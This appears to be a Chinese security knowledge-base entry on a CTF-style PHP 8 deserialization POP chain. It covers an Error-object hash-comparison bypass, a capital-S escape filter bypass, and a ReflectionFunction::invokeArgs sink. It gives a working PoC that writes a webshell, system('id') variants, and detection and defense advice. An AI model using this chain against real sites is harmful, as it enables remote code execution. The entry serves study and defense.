---
id: web-php-deserialization-call-variable-class-method-reflection-invokeargs
title: PHP8 反序列化 __call 可变类/可变方法 sink：ReflectionFunction::invokeArgs 任意函数调用写 WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: php-deser-call-variable-class-method-reflection
aliases:
- PHP8 反序列化 POP 链
- __call 可变类实例化
- new $args[0]($this->b) gadget
- ReflectionFunction invokeArgs
- ArrayIterator uksort 回调
- die() 触发 __toString
- 强类型哈希绕过 Error
tags:
- php
- php8
- deserialization
- pop-chain
- magic-method
- variable-class
- variable-method
- reflection-function
- native-class
- hash-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V208
  verified_at: '2026-11-07T02:34:45+08:00'
  notes: 已对照原文与5张图核对：PHP8 数组 md5 TypeError、Error 对象同串不同 code 绕过、S:5:"\6cover" 属性名过滤绕过、__wakeup→__toString→__invoke→__call 链、ReflectionFunction::invokeArgs 写 shell 均一致；已修正原文黑名单已含 system/passthru、ArrayIterator 变体不能直接套用本 sink 的说明。未验证点：PoC 未复跑；无受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

当 PHP8 反序列化链的 `__call` 中存在 `new $args[0]($this->b)` 与 `$a->$c($this->d)` 这种“类名来自参数、方法名来自属性”的可变类/可变方法 sink 时，可传入 `ReflectionFunction` 并由 `invokeArgs` 调用任意函数（如 `file_put_contents`）写 WebShell；入口处的 `md5/sha1` 强比较在 PHP8 不能用数组绕过（类型错误终止），改用 message 相同的 `Error` 对象即可，属性名过滤器可用大写 `S` 十六进制转义绕过。

## 原理

- **PHP8 强类型让数组哈希绕过失效**：`md5()`、`sha1()`、`preg_match()` 的形参声明为 `string`。PHP7 中传数组可让 `md5(array)===md5(array)` 成立，但 PHP8 会抛 `TypeError: md5(): Argument #1 ($string) must be of type string, array given` 并终止脚本，导致 `__wakeup` 走不到后续链。
- **Error 对象替代数组**：`Error`/`Exception` 的 `__toString()` 返回“类名: message in file:line + trace”，不含 `code`。用同一行、相同 message、不同 code 构造两个对象，则 `$a != $b` 为真而 `md5($a) === md5($b)`、`sha1($a) === sha1($b)` 同时成立，通过强比较。
- **属性名过滤器绕过**：`preg_match("/lover/i", $_POST['pop'])` 检查的是原始序列化串。PHP 序列化支持大写 `S` 格式，此时字符串内容按十六进制转义解析：`S:5:"\6cover"` 解码后是 `lover`（`\6c` = `l`），原始串中不含 `lover`，正则不命中。
- **魔术方法链**：`WebInfo::__wakeup()` 强比较通过后执行 `die($this->web)`；`die()` 把对象转字符串，触发 `FileHandle::__toString()`；其 `$func = $this->lover; $func();` 在 `lover` 为对象时触发 `DataBaseCon::__invoke()`；`__invoke` 调用 `($this->user)->lover($this->hello)`，`WafWaf` 没有 `lover` 方法，触发 `__call($func, $args)`。
- **可变类/方法 sink**：`WafWaf::__call` 先用正则检查 `$this->b` 的黑名单，通过后执行 `$a = new $args[0]($this->b)`（`$args[0]` 即 `$this->hello`）与 `$c = $this->c; $a->$c($this->d)`。攻击者把 `hello` 设为 `ReflectionFunction`、`b` 设为 `file_put_contents`、`c` 设为 `invokeArgs`、`d` 设为 `['shell.php','<?php ...?>']`，即可实例化反射对象并调用任意函数。
- **为什么能写文件/RCE**：`ReflectionFunction('file_put_contents')->invokeArgs([...])` 原样调用目标函数；`file_put_contents` 不在黑名单中，写入 Web 目录后访问即执行。在未被黑名单拦截的目标上可改用 `ReflectionFunction('system')->invokeArgs(['id'])` 回显命令；但本文黑名单已包含 `system`/`passthru`，需换未过滤函数或调整 sink。
- **同类原生类 gadget**：`ArrayIterator` 构造时接收数组，`uksort($callback)` 会把数组键作为参数传给回调；构造 `['id' => 1]` 并 `uksort('system')` 即执行 `system('id', 1)`（回调用不到第二个参数），同样可在拿到可变方法调用后执行命令（前提是 sink 允许构造参数为数组/对象）。

## 触发条件

- 存在用户可控的 `unserialize()`，且对象图能触达 `__wakeup`/`__toString`/`__invoke`/`__call` 链。
- 目标为 PHP 8（原文实测 8.0.22）；入口使用 `md5`/`sha1` 强比较时，需用对象而非数组绕过。
- 链中的 `__call` 或等价位置存在 `new $可控类名($可控参数)` 与 `$obj->$可控方法($可控参数)` 的可变类/可变方法 sink。
- 黑名单未覆盖所选函数：`file_put_contents`、`system` 等需不在 `$this->b` 的正则中；或可换 `ReflectionFunction`/`ArrayIterator` 之外的原生类。
- Web 目录对 PHP 进程可写，或所选函数能回显命令输出。

## 利用步骤

1. 审计入口：确认 `unserialize` 可控，找出 `__wakeup` 强比较、`die`/字符串化触发点，以及 `__call` 中的可变类/可变方法 sink 与黑名单。
2. 构造 hash bypass：同一行创建两个 `Error`（message 相同、code 不同），分别赋给强比较的两个属性。
3. 按链顺序连对象图：`WebInfo.web = FileHandle`；`FileHandle.lover = DataBaseCon`；`DataBaseCon.user = WafWaf`、`DataBaseCon.hello = 'ReflectionFunction'`；`WafWaf.b = 'file_put_contents'`、`WafWaf.c = 'invokeArgs'`、`WafWaf.d = ['shell.php','<?php phpinfo();?>']`。
4. 生成序列化串后，对属性名做 `S:5:"\6cover"` 替换，避开 `lover` 关键字过滤；URL 编码后作为 `pop` 参数提交。
5. 访问写入的文件确认执行，或写更完整的 WebShell。本文黑名单已覆盖 `system`/`passthru`，若要回显命令需选一个不在 `$this->b` 黑名单中的函数。
6. 若 `ReflectionFunction` 被禁用，需换其它能将可控参数传给危险函数的原生类；注意本文 `$this->b` 先作为 `preg_match` 的第二个参数（必须为字符串），`ArrayIterator` 的数组构造参数不能直接由 `$this->b` 提供，不能原样套用本 sink。

## PoC

```php
<?php
class DataBaseCon { public $user; public $hello; }
class FileHandle  { public $lover; }
class WafWaf      { public $a; public $b; public $c; public $d; }
class WebInfo     { public $web; public $syc; public $lover; }

$str = "Pr0";
$r1 = new Error($str, 1);
$r2 = new Error($str, 2);       // 同一行、同 message、不同 code

$a = new WebInfo();
$a->syc   = $r1;
$a->lover = $r2;
$a->web   = new FileHandle();
$a->web->lover = new DataBaseCon();
$a->web->lover->hello = "ReflectionFunction";
$a->web->lover->user  = new WafWaf();
$a->web->lover->user->b = "file_put_contents";
$a->web->lover->user->c = "invokeArgs";
$a->web->lover->user->d = ['shell.php', '<?php phpinfo();?>'];

$b   = serialize($a);
$exp = str_replace('s:5:"lo', 'S:5:"\\6co', $b);   // 属性名 lover -> \6cover
echo rawurlencode($exp);
?>
```

```http
POST /index.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

pop=<上面 rawurlencode 的序列化串>
```

命令执行变体：把 `d` 改为 `['id']`，并把 `b`/`c` 改为 `system`/`invokeArgs`；但本文黑名单包含 `system`/`passthru`，该组合会被 `preg_match` 拦截，实际需换一个不在黑名单中的函数或不同 sink。

## 变体与关联

- 变体（需 sink 允许构造参数为数组）：用 `ArrayIterator(['id'=>1])` + `uksort('system')` 代替 `ReflectionFunction`，回调键即命令；`uasort`/`uksort` 均接受 callable。本文 `__call` 的 `$this->b` 需先经 `preg_match`，不能直接传数组，故该变体不适用于本文链。
- 变体：可变方法可指向 `ReflectionFunction::invoke`、`ReflectionMethod::invoke`、`ReflectionClass::newInstanceArgs` 等，按可用类切换执行/实例化方式。
- 变体：`die($obj)`、`echo $obj`、字符串拼接都能触发 `__toString`；`$func()` 可触发 `__invoke`；访问不存在属性可换 `__get`。
- 关联：[[web-php-deserialization-error-exception-tostring-hash-bypass]]（Error/Exception 强比较绕过的完整原理与 eval 变体）、[[web-php-deserialization-capital-s-hex-escape-regex-filter-bypass]]（大写 S 十六进制转义绕过过滤器）、[[web-php-deserialization-native-class-array-walk-directory-read]]（原生类任意实例化 gadget）、[[web-php-rce-variable-class-function-call-reflection]]（非反序列化场景的可变类/反射函数调用）。
- 限制：链依赖目标恰好存在上述 `__call` 可变类/可变方法 sink；PHP8 的 `preg_match`/`md5` 类型错误会终止链，不能再依赖数组强碰撞。PoC 在原文本地环境（PHP 8.0.22 + 自定义类）实测写入成功，真实目标需按类名/属性名重写。

## 检测与防御

- 禁止对不可信输入 `unserialize()`；必须使用时用 `allowed_classes` 白名单，禁止 `Error`/`Exception` 及反射类、迭代器类进入对象图。
- 代码审计：禁止 `new $userControlledClass(...)`、`$obj->$userControlledMethod(...)`；类名/方法名/函数名用固定白名单映射。
- 删除 `__call`/`__invoke`/`__toString` 中的动态调用；哈希比较前强制 `is_string()`，用 `hash_equals`，不要对对象做 `md5`/`sha1`。
- 检测：请求中出现 `O:5:"Error"`、`O:9:"Exception"`、`ReflectionFunction`、`ArrayIterator`、`invokeArgs`、`uksort`；序列化串含大写 `S:` 十六进制转义；Web 进程异常写 `.php` 文件或拉起命令。
